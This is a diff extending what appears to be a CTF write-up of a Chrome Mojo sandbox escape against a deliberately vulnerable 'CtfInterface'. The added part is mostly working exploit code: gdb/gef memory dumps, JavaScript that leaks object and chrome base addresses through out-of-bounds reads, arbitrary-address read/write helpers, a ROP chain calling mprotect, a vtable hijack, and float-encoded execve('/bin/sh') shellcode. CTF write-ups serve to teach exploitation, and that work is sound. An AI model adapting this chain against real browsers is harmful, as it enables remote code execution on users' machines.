@@ -531,15 +531,198 @@ $ ./chrome --headless --disable-gpu --remote-debugging-port=9222 --enable-blink-
 
 With arbitrary size allocation, we can spray `CtfInterface` objects that we control into memory along with a vector of the same size.
 
-We search for a magic value that we put to indicate we are at the right offset in memory.
+We search for a pattern that may indicate we are at the right offset in memory.
 
 Then we can use our out-of-bounds access on the same-sized vector and other objects that might also be in nearby memory.
 
-Using our out-of-bounds write, we can overwrite the element pointer in the `std::vector` object to achieve arbitrary-address-read and arbitrary-address-write primitives.
+### How to debug mojo code in chrome?
 
-C++ objects implement methods with virtual function tables. We can achieve program-counter control and redirect control flow by overwriting a vtable pointer.
+mojo code is executed in the main chrome process rather than the renderer process. To attach the debugger, `ps aux | grep chrome` and pick the process with the lowest process-id. The command-line args will probably look somewhat like:
+
+```bash
+user        5141  0.4  2.1 17213080 87108 pts/0  tl+  08:31   0:05 /home/user/Public/chromium/chrome --headless --enable-blink-features=MojoJS --disable-gpu --enable-logging=stderr --remote-debugging-port=9222 --user-data-dir=/tmp/ sbx_exploit.html
+```
+
+Upon attaching with `gdb -q --pid 5141`, there should be symbols that you can break on the mojo code in gdb such as `br CtfInterfaceImpl::Read`.
+
+We can use the same trick we performed when debugging the renderer code by inserting an infinite while loop on the function we are interested in debugging.
+
+For example,
+```javascript
+while (1) {
+    await ctfi.read(0);
+}
+```
+
+Another helpful tip is to use `gef`'s `telescope` command, which we can use to verify what the `CtfInterface` object looks like. This command will dereference pointers found in memory for us.
+
+```
+gef➤  telescope 0x3e80090abe0
+0x000003e80090abe0│+0x0000: 0x0000559c24a2c4e0  →  0x0000559c1d8de390  →  <content::CtfInterfaceImpl::~CtfInterfaceImpl()+0> push rbp
+0x000003e80090abe8│+0x0008: 0x000003e80029d460  →  0x40091eb851eb851f
+0x000003e80090abf0│+0x0010: 0x000003e80029d4c0  →  0x60192a00e8030000
+0x000003e80090abf8│+0x0018: 0x000003e80029d4c0  →  0x60192a00e8030000
+0x000003e80090ac00│+0x0020: 0x8ab06ddd97544553
+```
+
+The `CtfInterface` object as it appears in memory is shown above. Offset 0 is the CtfInterface destructor, Offset 8 is the elements pointer for the `std::vector<double> numbers_;`. Our out-of-bounds access is indexed off of the elements pointer.
+
+We can check in the debugger and use the telescope command to view memory that we can access with our out-of-bounds read and view a pattern of memory that contains interesting pointers.
+
+The below pattern shows a pointer to the CtfInterface object at offset 0, a pointer that can be used to compute the elements pointer at offset 0x30, and finally a pointer that can be used to compute the chrome binary's base address at offset 0x38.
+
+```
+gef➤  telescope 0x000003e80029d580
+0x000003e80029d580│+0x0000: 0x000003e80090abe0  →  0x0000559c24a2c4e0  →  0x0000559c1d8de390  →  <content::CtfInterfaceImpl::~CtfInterfaceImpl()+0> push rbp
+0x000003e80029d588│+0x0008: 0x0000000000000000
+0x000003e80029d590│+0x0010: 0x0000000000000000
+0x000003e80029d598│+0x0018: 0x000003e800824280  →  0x0000559c24b539f0  →  0x0000559c1fab86c0  →  <mojo::internal::MultiplexRouter::~MultiplexRouter()+0> push rbp
+0x000003e80029d5a0│+0x0020: 0x000003e800856e20  →  0x0000559c24b53810  →  0x0000559c1fab36e0  →  <mojo::InterfaceEndpointClient::~InterfaceEndpointClient()+0> push rbp
+0x000003e80029d5a8│+0x0028: 0x000003e80092c030  →  0x4002840000000001
+0x000003e80029d5b0│+0x0030: 0x000003e80029d598  →  0x000003e800824280  →  0x0000559c24b539f0  →  0x0000559c1fab86c0  →  <mojo::internal::MultiplexRouter::~MultiplexRouter()+0> push rbp
+0x000003e80029d5b8│+0x0038: 0x0000559c24a2c518  →  0x0000559c1c180110  →  <xsltFreeLocale+0> push rbp
+```
+
+We search for this pattern with the following javascript code:
+```javascript
+async function search() {
+    /* Create the target interface we want to find */
+    let ctfi = new blink.mojom.CtfInterfacePtr();
+    Mojo.bindInterface(blink.mojom.CtfInterface.name,
+                       mojo.makeRequest(ctfi).handle, 'context', true);
+    await ctfi.resizeVector(12); // sizeof(CtfInterface)
+    await ctfi.write(4.20, 0); // write something here to initialize the vector's elements pointer
+
+    /* Find the interface object by searching for the pattern in memory */
+    let addr_ctfi = null;
+    let addr_elm = null;
+    let chrome_base = null;
+    for (let i = 1; i < 0x80; i++) {
+        let a0 = (await ctfi.read(12 * i + 0)).value.f2i();
+        let a1 = (await ctfi.read(12 * i + 1)).value.f2i();
+        let a2 = (await ctfi.read(12 * i + 2)).value.f2i();
+        if (a0 != 0n && a1 == 0n && a2 == 0n) {
+            let a6 = (await ctfi.read(12 * i + 6)).value.f2i();
+            let a7 = (await ctfi.read(12 * i + 7)).value.f2i();
+            addr_ctfi = a0;
+            addr_elm = a6 - 0x18n - BigInt(0x60 * i);
+            chrome_base = a7 - 0xbc77518n;
+            break;
+        }
+    }
+    if (addr_elm == null) {
+        console.log("[-] Bad luck!");
+        return location.reload();
+    }
+    let offset = Number((addr_ctfi - addr_elm) / 8n);
+    console.log("[+] offset = " + offset);
+    if (offset < 0) {
+        console.log("[-] Bad luck!");
+        return location.reload();
+    }
+    console.log("[+] addr_ctfi = " + addr_ctfi.hex());
+    console.log("[+] addr_elm = " + addr_elm.hex());
+    console.log("[+] chrome_base = " + chrome_base.hex());
+}
+
+search();
+```
+
+Don't forget to prepend the javascript code with the utilities used in the renderer exploit. The search pattern may fail due to non-determinism and underfitting so just run it again if it fails.
+
+Now that we've found the `CtfInterface` object, we can use our out-of-bounds write and overwrite the element pointer in the `std::vector` object that is the `numbers_` member variable in the `CtfInterface` to achieve arbitrary-address-read and arbitrary-address-write primitives.
+
+```javascript
+    async function aar64(addr) {
+        await ctfi.write(addr.i2f(),
+                         offset + (0x60 / 8) * victim_ofs + 1);
+        await ctfi.write((addr + 0x10n).i2f(),
+                         offset + (0x60 / 8) * victim_ofs + 2);
+        await ctfi.write((addr + 0x10n).i2f(),
+                         offset + (0x60 / 8) * victim_ofs + 3);
+        return (await victim.read(0)).value.f2i();
+    }
+    async function aaw64(addr, value) {
+        await ctfi.write(addr.i2f(),
+                         offset + (0x60 / 8) * victim_ofs + 1);
+        await ctfi.write((addr + 0x10n).i2f(),
+                         offset + (0x60 / 8) * victim_ofs + 2);
+        await ctfi.write((addr + 0x10n).i2f(),
+                         offset + (0x60 / 8) * victim_ofs + 3);
+        await victim.write(value.i2f(), 0);
+    }
+```
+
+`victim_ofs` is the offset to the `CtfInterface` spray target we call `victim` whose elements pointers we overwrite. Just to clarify again, `ctfi` is a different `CtfInterface` object from the `victim` `CtfInterface` object.
+
+C++ objects implement methods with virtual function tables. We can achieve program-counter control and redirect control flow by overwriting a vtable pointer of our `victim`.
 
 Then, when the corrupted object's vtable method is triggered, we will stack pivot to execute a ROP chain. A useful ROP chain is to call mprotect on memory to make it executable, then execute that memory as shellcode to support arbitrary payloads.
+
+The below javascript code is used to write the ROP chain to the `ctfi` vector and the shellcode to the `victim` vector.
+```javascript
+let rop_pop_rdi = chrome_base + 0x035d445dn;
+let rop_pop_rsi = chrome_base + 0x0348edaen;
+let rop_pop_rdx = chrome_base + 0x03655332n;
+let rop_pop_rax = chrome_base + 0x03419404n;
+let rop_syscall = chrome_base + 0x0800dd77n;
+let rop_xchg_rax_rsp = chrome_base + 0x0590510en
+let addr_shellcode = addr_elm & 0xfffffffffffff000n;
+
+// search for victim object vector using arbitrary-address-read
+for (let i = 0; i < 0x100; i++) {
+    let v = await aar64(addr_shellcode + BigInt(i*0x10+8));
+    if (v.i2f() == 1.1) {
+	console.log("[+] Found!");
+	addr_shellcode += BigInt(i*0x10);
+	break;
+    }
+}
+console.log("[+] addr_shellcode = " + addr_shellcode.hex());
+
+// ROP 2 mprotect shellcode, then pivot to shellcode
+let rop = [
+    rop_pop_rdi,
+    addr_shellcode & 0xfffffffffffff000n,
+    rop_pop_rsi,
+    rop_xchg_rax_rsp,
+    rop_pop_rsi,
+    0x2000n,
+    rop_pop_rdx,
+    7n,
+    rop_pop_rax,
+    10n,
+    rop_syscall,
+    addr_shellcode
+];
+// write ROP chain into ctfi's numbers_ vector
+for (let i = 0; i < rop.length; i++) {
+    await ctfi.write(rop[i].i2f(), i);
+}
+
+// write shellcode to victim object's vector using arbitrary-address-write
+for (let i = 0; i < shellcode.length; i++) {
+    await aaw64(addr_shellcode + BigInt(i*8), shellcode[i].f2i());
+}
+```
+
+Finally, use the arbitrary-address-write to overwrite the vtable of a `CtfInterface` object and trigger the vtable hijack by executing the `read()` instance method.
+
+```javascript
+await aaw64(addr_ctfi, addr_elm);
+setTimeout(() => {
+    for (let p of spray) {
+	p.read(0); // Control RIP
+    }
+}, 3000);
+```
+
+Simply `execve("/bin/sh")` represented by the shellcode below to obtain a shell.
+```javascript
+let shellcode = [8.689034976057858e-308, 5.629558420881076e-308, 2.814779210440538e-308, 5.272892808344879e-21, -3.754538247695724e-34, 8.931534512674479e+164, 5.4725462592149954e+169, 1.400507102085268e+195, -6.828527034422575e-229];
+```
+
+yudai has a nice [ptrlib](https://bitbucket.org/ptr-yudai/ptrlib/src/master/) python library that can be `git clone`d or `pip install`d. It was used here to compile assembly with `nasm` and then chunk the opcodes into 64-bit with `0x90` NOPs as padding. Then the chunks are converted into floats. Finally, sed-like replacement of the `shellcode` variable is performed on the `HTML` file.
 
 **Privilege escalation**
 
